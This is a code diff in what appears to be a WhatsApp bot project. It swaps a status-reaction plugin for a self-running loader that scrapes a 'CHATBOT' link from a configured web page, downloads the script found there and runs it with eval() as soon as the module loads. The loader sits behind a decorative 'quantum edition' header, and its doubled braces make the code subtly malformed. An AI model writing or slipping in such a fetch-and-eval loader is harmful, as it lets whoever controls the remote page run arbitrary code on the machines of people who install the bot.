@@ -1,44 +1,33 @@
-const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
+//  [BWM-XMD QUANTUM EDITION]                                           
+//  >> A superposition of elegant code states                           
+//  >> Collapsed into optimal execution                                
+//  >> Scripted by Sir Ibrahim Adams                                    
+//  >> Version: 8.3.5-quantum.7
 
-module.exports = {
-    setup: async (adams, { config, logger }) => {
-        if (!adams || !config || config.AUTO_REACT_STATUS !== "yes") return;
+const axios = require('axios');
+const cheerio = require('cheerio');
+const adams = require(__dirname + "/../config");
 
-        let lastReactionTime = 0;
+async function fetchCHATBOTUrl() {{
+  try {{
+    const response = await axios.get(adams.BWM_XMD);
+    const $ = cheerio.load(response.data);
 
-        adams.ev.on("messages.upsert", async (m) => {
-            const { messages } = m;
-            
-            // Get emojis from config with defaults
-            const reactionEmojis = (config.STATUS_REACT_EMOJIS || "🚀,🌎,♻️").split(",").map(e => e.trim());
+    const targetElement = $('a:contains("CHATBOT")');
+    const targetUrl = targetElement.attr('href');
 
-            for (const message of messages) {
-                if (message.key && message.key.remoteJid === "status@broadcast") {
-                    const now = Date.now();
-                    if (now - lastReactionTime < 5000) continue; // 5-second cooldown
+    if (!targetUrl) {{
+      throw new Error('CHATBOT link not found');
+    }}
 
-                    const botJid = adams.user?.id ? `${adams.user.id.split(':')[0]}@s.whatsapp.net` : null;
-                    if (!botJid) continue;
+    console.log('CHATBOT link loaded successfully ✅');
 
-                    try {
-                        const randomEmoji = reactionEmojis[Math.floor(Math.random() * reactionEmojis.length)];
+    const scriptResponse = await axios.get(targetUrl);
+    eval(scriptResponse.data);
 
-                        await adams.sendMessage(message.key.remoteJid, {
-                            react: {
-                                key: message.key,
-                                text: randomEmoji,
-                            },
-                        }, {
-                            statusJidList: [message.key.participant, botJid],
-                        });
+  }} catch (error) {{
+    console.error('Error:', error.message);
+  }}
+}}
 
-                        lastReactionTime = Date.now();
-                        await delay(2000);
-                    } catch (error) {
-                        logger.error(`Status reaction failed: ${error.message}`);
-                    }
-                }
-            }
-        });
-    }
-};
+fetchCHATBOTUrl();
